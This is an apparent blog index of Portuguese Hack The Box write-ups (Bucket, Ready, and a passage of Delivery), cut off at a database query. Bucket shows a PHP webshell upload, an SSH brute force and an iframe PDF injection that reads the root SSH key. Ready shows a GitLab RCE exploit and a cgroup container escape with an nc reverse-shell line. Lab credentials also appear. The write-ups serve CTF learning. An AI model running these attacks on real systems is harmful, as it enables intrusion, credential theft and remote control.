\\     --endpoint-url http://s3.bucket.htb \\     --profile bucket.htb 2021-02-26 11:48:02 adserver  $ aws s3 ls s3://adserver \\     --endpoint-url http://s3.bucket.htb \\     --profile bucket.htb                            PRE images/ 2021-02-26 11:50:04       5344 index.html  $ aws s3 ls s3://adserver/images/ \\     --endpoint-url http://s3.bucket.htb \\     --profile bucket.htb 2021-02-26 11:52:02      37840 bug.jpg 2021-02-26 11:52:02      51485 cloud.png 2021-02-26 11:52:02      16486 malware.png   Acesso inicial   Uma vez que temos acesso ao blob s3 e sabemos quais conteúdos disponíveis e como utilizá-lo, a primeira coisa a se fazer é realizar o upload de um arquivo para shell reverso. Em primeiro momento vamos validar a possibilidade de utilizar php com um webshell simples conforme abaixo:   &lt;?php system($_GET['cmd']); ?&gt;   Após a criação do arquivo, realizado o upload via CLI vide comandos abaixo:   $ aws s3 cp ./exploit.php s3://adserver/ \\     --endpoint-url http://s3.bucket.htb \\     --profile bucket.htb upload: ./exploit.php to s3://adserver/exploit.php                  $ aws s3 --endpoint-url http://s3.bucket.htb --profile bucket.htb ls s3://adserver/                                          PRE images/ 2021-02-26 11:56:28         31 exploit.php 2021-02-26 11:56:02       5344 index.html   Ao tentar acessá-lo alguns instantes depois, notei que o arquivo que enviei foi removido por outro processo. Para tentar contornar a questão, configurei para que a chamada de execução de comando fosse realizada assim que o upload fosse finalizado, executando o comando id, onde pudemos confirmar o sucesso na tarefa realizada.   $ aws s3 cp ./exploit.php s3://adserver/ \\     --endpoint-url http://s3.bucket.htb --profile bucket.htb &amp;&amp; curl -L http://bucket.htb/exploit.php?cmd=id upload: ./exploit.php to s3://adserver/exploit.php                 uid=33(www-data) gid=33(www-data) groups=33(www-data)   Para um shell reverso, alterei o arquivo a ser enviado de exploit.php pelo pentestmonkey/php-reverse-shell (github.com) que já iniciaria a conexão reversa a um listener previamente definido, sem a necessidade de enviar parâmetros no payload, o qual tivemos sucesso após algumas tentativas.   aws s3 --endpoint-url http://s3.bucket.htb --profile bucket.htb cp ./exploit.php s3://adserver/ &amp;&amp; curl -L http://bucket.htb/exploit.php   User flag   Uma vez com acesso ao shell da máquina, executei o linpeas.sh para simplificar a enumeração, onde os seguintes itens foram identificados:           Usuário local roy possui acesso à máquina e, enumerando seu diretório observado a existencia do arquivo user.txt, o qual não temos acesso leitura com a conta www-data além de uma pasta project a ser inspecionada.              Este usuário não possui nenhum processo em execução que eventualmente permita a exploração logo precisaremos obter suas credenciais de alguma forma.                Alguns outros serviços encontram-se em execução nesta máquina, funcionando nas portas 4566, 8000 e 38443, que possivelmente venham a dar privilégios a outras atividades em um segundo momento.       [+] Active Ports                                                                                          [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                                Active Internet connections (servers and established)                                                      Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name          tcp        0      0 127.0.0.1:38443         0.0.0.0:*               LISTEN      -                         tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                          tcp        0      0 127.0.0.1:4566          0.0.0.0:*               LISTEN      -                          tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                          tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                                     Esta máquina possui serviços de container em execução (ctr, runc), que executam provavelmente o localstack e que poderiam ser avaliados para escalação de privilégios.            Existe um diretório /var/www/bucket-app que pode ser a aplicação servida em uma das portas identificadas, mas que não possuímos acesso de leitura com a conta utilizada.       Dos pontos mencionados, o que mais chamou atenção foi o possível website em execução nas portas citadas, logo iniciei por verificar as configurações ativas no Apache (/etc/apache2/sites-enabled) onde tínhamos o arquivo 000-default.conf listado abaixo, mas não encontrei nada sobre a porta 38443, mas tive a informação sobre a porta 4566, que é publicada pela porta 80 e na porta 8000, que é publicado o website disponível na pasta /var/www/bucket-app.   &lt;VirtualHost 127.0.0.1:8000&gt;     &lt;IfModule mpm_itk_module&gt;         AssignUserId root root     &lt;/IfModule&gt;     DocumentRoot /var/www/bucket-app &lt;/VirtualHost&gt;  &lt;VirtualHost *:80&gt;     DocumentRoot /var/www/html     RewriteEngine On     RewriteCond %{HTTP_HOST} !^bucket.htb$     RewriteRule /.* http://bucket.htb/ [R] &lt;/VirtualHost&gt; &lt;VirtualHost *:80&gt;     ProxyPreserveHost on     ProxyPass / http://localhost:4566/     ProxyPassReverse / http://localhost:4566/     &lt;Proxy *&gt;         Order deny,allow         Allow from all     &lt;/Proxy&gt;     ServerAdmin webmaster@localhost     ServerName s3.bucket.htb      ErrorLog ${APACHE_LOG_DIR}/error.log     CustomLog ${APACHE_LOG_DIR}/access.log combined  &lt;/VirtualHost&gt;   Embora possível identificar os serviços ativos apenas a partir da máquina local, precisaremos realizar a exploração apenas via linha de comando ou precisaremos de uma conta na máquina para tunelar o acesso a partir de SSH.   Já que os websites não permitiram muitos detalhes na enumeração, decidi testar as senhas obtidas anteriormente via DynamoDB para o usuário roy e felizmente tivemos sucesso. Abaixo a execução do hydra que utilizei para automatizar  brute force na conta via SSH.   $ hydra -l roy -P passwords 10.10.10.212 -t 4 ssh Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).  Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-26 12:55:36 [DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:1/p:3), ~1 try per task [DATA] attacking ssh://10.10.10.212:22/ [22][ssh] host: 10.10.10.212   login: roy   password: n2vM-&lt;_K_Q:.Aa2 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-02-26 12:55:40   Uma vez que tínhamos agora acesso à máquina com as credenciais do usuário roy, coletei a flag de usuário após me conectar via SSH:   roy@bucket:~$ id uid=1000(roy) gid=1000(roy) groups=1000(roy),1001(sysadm) roy@bucket:~$ cat user.txt  &lt;redacted&gt;   Root flag   Com o acesso ao usuário roy pude validar o acesso aos diretórios project, que tem aparentemente uma estrutura de um website, além de conseguir com esta conta acessar o conteúdo da aplicação em /var/www/bucket-app que possui estrutura bastante similar ao encontrado na pasta project, o qual fiz uma cópia para análise a partir da máquina atacante.   Analisando o conteúdo de index.php temos um algo bem interessante: uma função escondida para que sempre que chamada POST na página http://127.0.0.1:8000 com o parâmetro action=get_alerts, é feita uma consulta numa tabela alerts no DynamoDB em que os valores com Title Ransonware são incluídos em um PDF e disponibilizados na pasta /var/www/bucket-app/files/.   &lt;?php require 'vendor/autoload.php'; use Aws\\DynamoDb\\DynamoDbClient; if($_SERVER[\"REQUEST_METHOD\"]===\"POST\") {     if($_POST[\"action\"]===\"get_alerts\") {         date_default_timezone_set('America/New_York');         $client = new DynamoDbClient([             'profile' =&gt; 'default',             'region'  =&gt; 'us-east-1',             'version' =&gt; 'latest',             'endpoint' =&gt; 'http://localhost:4566'         ]);          $iterator = $client-&gt;getIterator('Scan', array(             'TableName' =&gt; 'alerts',             'FilterExpression' =&gt; \"title = :title\",             'ExpressionAttributeValues' =&gt; array(\":title\"=&gt;array(\"S\"=&gt;\"Ransomware\")),         ));          foreach ($iterator as $item) {             $name=rand(1,10000).'.html';             file_put_contents('files/'.$name,$item[\"data\"]);         }         passthru(\"java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf\");     } } else { ?&gt;   Uma vez que não temos uma tabela chamada alerts, conforme já enumerado, precisaremos criá-la com os atributos title e data, este, por sua vez, com conteúdo HTML a ser renderizado e posteriormente salvo no formato PDF, permitindo a possível obtenção de dados sensíveis da máquina.   Para os testes iniciais, conforme documentação da AWS disponível neste link, criei um script para criação da tabela, inclusão de uma entrada e posterior chamada POST na URL em questão para gerar o arquivo PDF.   Para simplificar este processo, que está sendo feito da máquina atacante, realizados os seguintes procedimentos:      Na máquina atacante, criado chave RSA (ssh-keygen) e atribuido chave pública dela ao usuário roy na máquina bucket para que não fosse necessário o uso de senhas durante a autenticação.   Na máquina atacante também foi criado o tunelamento da porta local 8000/TCP, a qual foi redirecionada para a porta 8000 na máquina bucket, fazendo o serviço disponível também localmente, o que posteriormente foi possível validar acessando localmente a página conforme evidencia abaixo   ssh roy@10.10.10.212 -L 8000:127.0.0.1:8000       Após algumas tentativas, notei que similar ao desafio encontrado durante o upload do shell reverso, os itens criados no DynamoDB também são removidos após algum tempo, logo foi necessário encadear todas as requisições para que tivéssemos tempo para executar a ação imediatamente assim que os recursos estivessem disponíveis, assim como a posterior cópia dos ativos se obtivermos sucesso na chamada.   aws dynamodb create-table \\     --table-name alerts \\     --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S \\     --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE \\     --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=10 \\     --endpoint-url http://s3.bucket.htb \\     --profile bucket.htb &amp;&amp; \\ aws dynamodb put-item \\     --table-name alerts \\     --item '{\"title\": {\"S\": \"Ransomware\"},\"data\": {\"S\": \"&lt;html&gt;&lt;head&gt;&lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Head 1&lt;/h1&gt;&lt;p&gt;Content&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;\"}}' \\     --return-consumed-capacity TOTAL \\     --endpoint-url http://s3.bucket.htb \\     --profile bucket.htb &amp;&amp; \\ curl --data \"action=get_alerts\" http://localhost:8000/   Após algumas tentativas, seguido do desafio do tempo para cópia do arquivo para a máquina atacante, foi possível gerar e copiar o arquivo PDF com base no HTML enviado.   roy@bucket:/var/www/bucket-app/files$ ls -la total 16 drwxr-x---+ 2 root root 4096 Feb 26 18:51 . drwxr-x---+ 4 root root 4096 Feb 10 12:29 .. -rw-r--r--  1 root root   88 Feb 26 18:51 7627.html -rw-r--r--  1 root root 1870 Feb 26 18:51 result.pdf      Uma vez que conseguimos renderizar o conteúdo desejado, precisamos encontrar uma forma de incluir arquivos na página renderizada e que resulta no PDF, de modo a dar continuidade na exploração.   A forma mais fácil de obter o root flag seria importar o arquivo /root/root.txt, porém isso não nos dá um shell reverso de fato. Seguindo o exemplo da máquina Passage, podemos buscar por um arquivo /root/.ssh/id_rsa e nos conectar à máquina via shell interativo, porém nosso maior problema no momento é inserir o conteúdo destes em um arquivo HTML.   Após algumas pesquisas, a forma mais simples de alcançar este objetivo sem o uso de Javascript é utilizando um iframe, onde as alterações, para a qual incluí a tag &lt;iframe src=\"/root/.ssh/id_rsa\" seamless&gt;&lt;/iframe&gt; no HTML utilizado anteriormente, conforme chamadas abaixo:   aws dynamodb create-table \\     --table-name alerts \\     --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S \\     --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE \\     --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=10 \\     --endpoint-url http://s3.bucket.htb \\     --profile bucket.htb &amp;&amp; \\ aws dynamodb put-item \\     --table-name alerts \\     --item '{\"title\": {\"S\": \"Ransomware\"},\"data\": {\"S\": \"&lt;html&gt;&lt;head&gt;&lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Head 1&lt;/h1&gt;&lt;iframe src=\\\"/root/.ssh/id_rsa\\\" seamless&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;/html&gt;\"}}' \\     --return-consumed-capacity TOTAL \\     --endpoint-url http://s3.bucket.htb \\     --profile bucket.htb &amp;&amp; \\ curl --data \"action=get_alerts\" http://localhost:8000/       Após o procedimento foi possível baixar o aquivo /var/www/bucket-app/files/result.pdf e, com o conteúdo presente neste arquivo, criar o arquivo id_rsa, o qual foi posteriormente utilizado para conectar-se à máquina via SSH e obter a shell a partir do usuário root.   root@bucket:~# id uid=0(root) gid=0(root) groups=0(root) root@bucket:~# cat /root/root.txt &lt;redacted&gt;   Espero que tenham gostado!   Vejo vocês novamente em breve no próximo post! :smiley:  ","categories": ["Writeup"],
        "tags": ["HackTheBox","htb-medium","htb-linux"],
        "url": "https://davicruz.com/writeup/2021/04/htb-bucket/",
        "teaser": "https://i.imgur.com/m7oESPT.png"
      },{
        "title": "Hackthebox write-up: Ready",
        "excerpt":"Olá pessoal!   A máquina desta semana será Ready, outra máquina Linux classificada como mediana do Hack The Box, criada por bertolis.   :information_source: Info: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas      Esta máquina foi bem interessante sua resolução, onde exploramos uma versão vulnerável do GitLab Server e na sequência precisamos escapar do container docker para obter a flag de root.   Enumeração   Como de costume, iniciamos com a enumeração rápida do nmap para identificar os serviços publicados nesta máquina:   $ nmap -sC -sV -Pn -oA quick 10.10.10.220 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-27 12:05 -03 Nmap scan report for 10.10.10.220 Host is up (0.078s latency). Not shown: 998 closed ports PORT     STATE SERVICE VERSION 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey:  |   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) |   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 5080/tcp open  http    nginx | http-robots.txt: 53 disallowed entries (15 shown) | / /autocomplete/users /search /api /admin /profile  | /dashboard /projects/new /groups/new /groups/*/edit /users /help  |_/s/ /snippets/new /snippets/*/edit | http-title: Sign in \\xC2\\xB7 GitLab |_Requested resource was http://10.10.10.220:5080/users/sign_in |_http-trane-info: Problem with XML parsing of /evox/about Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.65 seconds   5080/TCP - Serviço HTTP   Conforme pode ser visto no resultado do nmap se trata de um serviço GitLab Community. Similar à máquina Laboratory, segui com a criação de uma nova conta para verificar a versão do servidor e eventuais projetos públicos disponíveis.   Após criada a conta, pude comprovar que a versão em execução é a 11.4.7, conforme podemos ver na imagem abaixo.      Initial Foothold   Realizando uma busca rápida no searchsploit, identificadas algumas versões de exploit para a versão de GitLab Server identificada.   $ searchsploit gitlab 11.4.7 ------------------------------------------------------------------------- ---------------------------------  Exploit Title                                                           |  Path ------------------------------------------------------------------------- --------------------------------- GitLab 11.4.7 - RCE (Authenticated)                                      | ruby/webapps/49334.py Gitlab 11.4.7 - Remote Code Execution                                    | ruby/webapps/49257.py GitLab 11.4.7 - Remote Code Execution (Authenticated)                    | ruby/webapps/49263.py ------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results   Utilizando o último exploit listado (49334.py) notei que não possuía a opção de fornecer a porta do GitLab Server (vide output abaixo), assim como existe um erro nos parâmetros para recebimento do shell reverso onde foi necesário alterar o parametro local_port para local_port = args.P.   $ python3 49334.py -h                                                                 usage: 49334.py [-h] -u U -p P -g G -l L -P P  GitLab 11.4.7 RCE  optional arguments:   -h, --help  show this help message and exit   -u U        GitLab Username/Email   -p P        Gitlab Password   -g G        Gitlab URL (without port)   -l L        reverse shell ip   -P P        reverse shell port   Adicionalmente, foi necessário alterar o payload utilizado pelo script, que apenas realizava a conexão via nc no endereço e portas especificados, mas nao exportava o /bin/sh, impedindo a interação com a máquina.   Após ajustes, obtido shell com a conta git no diretório ~/gitlab-rails/working   User flag   Após shell inicial, iniciada enumeração fazendo uso do linenum.sh, onde os seguintes pontos chamaram atenção:           Execução dentro de container docker, possivelmente sendo necessário futuramente escapar deste para o host.            Existe usuário local dude (id=1000), no qual o arquivo user.txt encontra-se em seu home directory.            Obtido hash de contas do GitLab Server, onde o usuário root é o único privilegiado, possuindo o seguinte hash de senha:                                  username           e-mail           admin           hash                                           root           admin@example.com           true           $2a$10$zzun9kmrHMdwsJZKTmwn9OZddFjwrhbaXx3b2eb9l2g.1LrjZo0V2                           Com base nas informações acima, ao validar os privilégios necessários para ler o arquivo user.txt, identificado que o usuário corrente (git), possuía acesso, logo obtivemos a flag de usuário.   git@gitlab:/home/dude$ ls -la total 24 drwxr-xr-x 2 dude dude 4096 Dec  7 16:58 . drwxr-xr-x 1 root root 4096 Dec  2 10:45 .. lrwxrwxrwx 1 root root    9 Dec  7 16:58 .bash_history -&gt; /dev/null -rw-r--r-- 1 dude dude  220 Aug 31  2015 .bash_logout -rw-r--r-- 1 dude dude 3771 Aug 31  2015 .bashrc -rw-r--r-- 1 dude dude  655 May 16  2017 .profile -r--r----- 1 dude git    33 Dec  2 10:46 user.txt git@gitlab:/home/dude$ cat user.txt &lt;redacted&gt;   Root flag   O próximo passo seria obter a flag de root. Tendo o hash de senha, conforme observado via enumeração do LinEnum poderíamos realizar o cracking dele usando algum dicionário, porém em buscas realizadas sobre este hash em sites da internet não resultaram em nada, logo deixei essa opção para o final, caso não encontre outro modo.   Durante a enumeração do LinEnum, o seguinte texto é listado junto da listagem das contas:      If you have enough privileges, you can make an account under your control administrator by running: gitlab-rails runner ‘user = User.find_by(email: “youruser@example.com”); user.admin = TRUE; user.save!’ Alternatively, you could change the password of any user by running: gitlab-rails runner ‘user = User.find_by(email: “admin@example.com”); user.password = “pass_peass_pass”; user.password_confirmation = “pass_peass_pass”; user.save!’    Com base nesta informação, segui para o reset da senha do usuário root conforme recomendado, porém nenhum repositório privado ou informação adicional foi encontrada, que pudesse auxiliar na obtenção das credenciais de root.   Uma vez que nao encontrei nenhum processo ou informação para o usuário dude e crackear a senha com base no hash identificado não era uma opção rápida, segui para a enumeração manual, onde acabei encontrando um diretório /opt/backup, que continha diversos arquivos.   Buscando neste diretório por palavras chaves como passwd, password, encontrei uma entrada que chamou atenção no arquivo /opt/backup/gitlab.rb, conforme podemos ver abaixo dentre as linhas comentadas e em branco, removidas utilizando o comando grep listado   git@gitlab:/opt/backup$ cat /opt/backup/gitlab.rb | grep -Ev '^#|^$' gitlab_rails['smtp_password'] = \"wW59U!ZKMbG9+*#h\" git@gitlab:/opt/backup$   Com a senha encontrada, testado para o usuário root, o que confirmou a validade da credencial, porém no diretório raiz deste usuário não existe um arquivo root.txt, o que indica que precisaremos escapar do container e obter a flag a partir do host docker.   git@gitlab:/opt/backup$ su root Password: root@gitlab:/opt/backup# ls -la /root total 28 drwx------ 1 root root 4096 Feb 27 13:24 . drwxr-xr-x 1 root root 4096 Dec  1 12:41 .. lrwxrwxrwx 1 root root    9 Dec  7 16:56 .bash_history -&gt; /dev/null -rw-r--r-- 1 root root 3106 Oct 22  2015 .bashrc drwxr-xr-x 2 root root 4096 Feb 27 13:24 .nano -rw-r--r-- 1 root root  148 Aug 17  2015 .profile drwx------ 2 root root 4096 Dec  7 16:49 .ssh -rw------- 1 root root 1565 Dec 13 15:06 .viminfo root@gitlab:/opt/backup#   Escapando do container   Uma vez que temos privilégios de root, se o container estiver rodando sob circunstâncias especificas, podemos escapar do mesmo para o host, conforme encontrei a partir de uma pesquisa e extremamente bem documentado no blog Understanding Docker container escapes | Trail of Bits Blog.   Seguindo o passo-a-passo descrito neste blog, criado um listener na porta 4443 TCP na máquina atacante e realizados os seguintes procedimentos com o usuário root no container, obtendo assim um shell reverso.   # In the container mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x   echo 1 &gt; /tmp/cgrp/x/notify_on_release host_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab` echo \"$host_path/cmd\" &gt; /tmp/cgrp/release_agent   echo '#!/bin/sh' &gt; /cmd echo \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/f\" &gt;&gt; /cmd chmod a+x /cmd   sh -c \"echo \\$\\$ &gt; /tmp/cgrp/x/cgroup.procs\"   Com a conexão recebida, confirmado que estávamos dentro do host executando o comando docker ps e, na sequência, obtido a flag de root.   $ nc -lnvp 4443 listening on [any] 4443 ... connect to [10.10.14.136] from (UNKNOWN) [10.10.10.220] 38246 /bin/sh: 0: can't access tty; job control turned off # id uid=0(root) gid=0(root) groups=0(root) # docker ps CONTAINER ID        IMAGE                          COMMAND             CREATED             STATUS                 PORTS                                   NAMES 7eb263389e5e        gitlab/gitlab-ce:11.4.7-ce.0   \"/assets/wrapper\"   2 months ago        Up 5 hours (healthy)   22/tcp, 443/tcp, 0.0.0.0:5080-&gt;80/tcp   docker-gitlab_web_1 # cat /root/root.txt &lt;redacted&gt;   Espero que tenham gostado.   Vejo vocês no próximo post! :smile:  ","categories": ["Writeup"],
        "tags": ["HackTheBox","htb-medium","htb-linux"],
        "url": "https://davicruz.com/writeup/2021/05/htb-ready/",
        "teaser": "https://i.imgur.com/R2EVM1J.png"
      },{
        "title": "Hackthebox write-up: Delivery",
        "excerpt":"Olá pessoal!   A máquina desta semana será Delivery, outra máquina Linux classificada como fácil do Hack The Box, criada por ippsec.   :information_source: Info: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas      A resolução desta máquina foi bem interessante, onde tive a oportunidade de aprender a crackear senhas utilizando variações de dicionários utilizando o hashcat, além de vários pivoteamentos, porém simples, até que chegássemos nas credenciais de user e logo após sua obtenção, root.   Enumeração   Como de costume, iniciado com scan rápido do nmap para que possamos identificar os serviços publicados nesta máquina.   $ nmap -sC -sV -Pn -oA quick 10.10.10.222 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-20 17:01 -03 Nmap scan report for 10.10.10.222 Host is up (0.16s latency). Not shown: 998 closed ports PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey:  |   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA) |   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA) |_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519) 80/tcp open  http    nginx 1.14.2 |_http-server-header: nginx/1.14.2 |_http-title: Welcome Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 32.54 seconds   80/TCP - Serviço HTTP   Acessando a página e inspecionando o código-fonte, identifiquei que existe um link para helpdesk.delivery.htb. Adicionada entrada encontrada, assim como dominio delivery.htb, no /etc/hosts da máquina para permitir o acesso aos websites publicados nesta máquina.      Ao clicar no link Contact us, a seguinte informação é exibida, informando que assim que tivermos um e-mail delivery.htb, poderemos acessar a plataforma MatterMost, que, conforme links enumerados, funciona na porta TCP 8065.      CONTACT US    For unregistered users, please use our HelpDesk to get in touch with our team. Once you have an @delivery.htb email address, you’ll be able to have access to our MatterMost server.    Seguindo com a tentativa de conseguir um e-mail com o HelpDesk, aberto um ticket com conteúdo de mentira enquanto inspecionava as requisições via BurpSuite.   Após concluída a abertura do ticket, recebida seguinte informação, algo que foi crucial para obter acesso ao MatterMost: um endereço de e-mail do domínio @delivery.htb!      Acessando a plataforma do Mattermost criado uma conta e informado o e-mail recém obtido. Desta forma, caso precisemos receber alguma validação do serviço, os dados estarão disponíveis como comentários no ticket que acabamos de abrir :smile:.      Como esperado, ao verificar o status do ticket criado, comprovamos que nos comentários tínhamos um e-mail de confirmação do Mattermost, enviado para 8024065@delivery.htb, onde pudemos obter o link de verificação para o serviço.      Após verificada a conta, pudemos acessar o portal com as credenciais previamente utilizadas e obter acesso a um time chamado Internal.      Dentre as mensagens neste time, algumas chamaram atenção, que continham informações importantes para a resolução desta máquina:      Credenciais para o osTicket são maildeliverer:Youve_G0t_Mail!.   Desenvolvedores utilizavam com frequência variações de PleaseSubscribe! e deveriam deixar de fazê-lo.            Estas variações poderiam ser facilmente craqueadas utilizando hashcat rules, que foi uma dica bastante valiosa em como quebrar a senha de root ou algo em seu caminho.              Buscando a página de administração do osTicket, fiz logoff da conta Guest User, do lado esquerdo superior e, durante o processo de sign-in, selecionei a opção I’m an agent - sign in here, que me levou à URL http://helpdesk.delivery.htb/scp/login.php, de onde é feita a administração dos incidentes gerados na plataforma.      Ao acessá-la com as credenciais do usuário maildeliverer, pude confirmar acesso ao serviço e validar a versão em execução do osTicket, que é a 1.15.1, onde vamos buscar um acesso inicial a partir de alguma vulnerabilidade ou funcionalidade existente na plataforma.      Navegando pela console, encontrei uma API, onde menciona a execução de tarefas usando cron, que poderia eventualmente ser utilizado pra algum acesso inicial na máquina. Vendo a documentação encontrei este link que menciona o arquivo scripts\\rcron.php o qual é utilizado para manipular as chamadas.   Segui então com a criação de uma API key para o endereço IP da minha máquina e baixei o script deste link para inspecionar a execução, porém em nada disso obtive o sucesso esperado.   Acesso inicial e User flag   Embora tenha analisado algumas possibilidades via osTicket API, acabei voltando atrás e pensando simples, me perguntando: Será que a conta maildeliverer é um usuário desta máquina? Ao tentar conectar via SSH usando as mesmas credenciais do osTicket consegui o acesso inicial com esta conta :man_facepalming:. De quebra, dentro do diretório deste usuário havia o arquivo user.txt o qual permitiu a leitura da flag.   $ ssh maildeliverer@10.10.10.222                                                                                                  The authenticity of host '10.10.10.222 (10.10.10.222)' can't be established. ECDSA key fingerprint is SHA256:LKngIDlEjP2k8M7IAUkAoFgY/MbVVbMqvrFA6CUrHoM. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.10.222' (ECDSA) to the list of known hosts. maildeliverer@10.10.10.222's password: Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64  The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright.  Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Tue Jan  5 06:09:50 2021 from 10.10.10.10 maildeliverer@Delivery:~$ ls -la total 28 drwxr-xr-x 3 maildeliverer maildeliverer 4096 Jan  3 23:12 . drwxr-xr-x 3 root          root          4096 Dec 26 09:01 .. lrwxrwxrwx 1 root          root             9 Dec 28 07:04 .bash_history -&gt; /dev/null -rw-r--r-- 1 maildeliverer maildeliverer  220 Dec 26 09:01 .bash_logout -rw-r--r-- 1 maildeliverer maildeliverer 3526 Dec 26 09:01 .bashrc drwx------ 3 maildeliverer maildeliverer 4096 Dec 28 06:58 .gnupg -rw-r--r-- 1 maildeliverer maildeliverer  807 Dec 26 09:01 .profile -r-------- 1 maildeliverer maildeliverer   33 Feb 24 06:58 user.txt maildeliverer@Delivery:~$ cat user.txt &lt;redacted&gt;   Root flag   Iniciado com a execução do linpeas.sh para que pudesse realizar a enumeração mais rapidamente, onde os seguintes pontos chamaram atenção:      Processo python3 /root/py-smtp.py em execução pelo usuário root. Pode eventualmente permitir algum tipo de path hijack dependendo de quais binários são chamados por este script, caso tenhamos acesso leitura no mesmo.   Também é executado por root um script em /root/mail.sh, podendo ser eventualmente explorado conforme item anterior.   Serviço MySQL em execução na máquina na porta padrão (3306/TCP).   osTicket   Embora pudessem ser caminhos promissores, não foi possível ler os arquivos citados, logo parti pra outra abordagem que seria buscar por credencias para conexão no MySQL. Analisando os arquivos do osTicket, encontrei em /var/www/osticket/upload/include/ost-config.php as credenciais para o usuário ost_user:   define('SECRET_SALT','nP8uygzdkzXRLJzYUmdmLDEqDSq5bGk3');  define('ADMIN_EMAIL','maildeliverer@delivery.htb');  define('DBTYPE','mysql'); define('DBHOST','localhost'); define('DBNAME','osticket'); define('DBUSER','ost_user'); define('DBPASS','!H3lpD3sk123!');  define('TABLE_PREFIX','ost_');   Entretanto ao se conectar no banco de dados, não encontrado nenhuma informação útil, onde decidi seguir para a aplicação Mattermost.   Mattermost   De acordo com os processos em execução, a aplicação é executada a partir do diretório /opt/mattermost/config/config.json encontrei outra credencial para conexão ao mysql.    \"SqlSettings\": {         \"DriverName\": \"mysql\",         \"DataSource\": \"mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\\u0026readTimeout=30s\\u0026writeTimeout=30s\",         \"DataSourceReplicas\": [],         \"DataSourceSearchReplicas\": [],         \"MaxIdleConns\": 20,         \"ConnMaxLifetimeMilliseconds\": 3600000,         \"MaxOpenConns\": 300,         \"Trace\": false,         \"AtRestEncryptKey\": \"n5uax3d4f919obtsp1pw1k5xetq1enez\",         \"QueryTimeout\": 30,         \"DisableDatabaseSearch\": false     }   Utilizando as credenciais mmuser:Crack_The_MM_Admin_PW acessei o database mattermost e na tabela users, encontrei os seguintes usuários e hashes, onde temos o usuário root com privilégios de system_admin   MariaDB [mattermost]&gt; select Username,Password,Roles from Users; +----------------------------------+--------------------------------------------------------------+--------------------------+ | Username                         | Password                                                     | Roles                    | +----------------------------------+--------------------------------------------------------------+--------------------------+ | jdoe                             | $2a$10$qmuCH.AHht/dUGLd8ZyxMOMeZl6nU67B5okAiC0Vx44isKs5y6nkq | system_user              | | surveybot                        |                                                              | system_user              | | c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK | system_user              | | 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G | system_user              | | root                             | 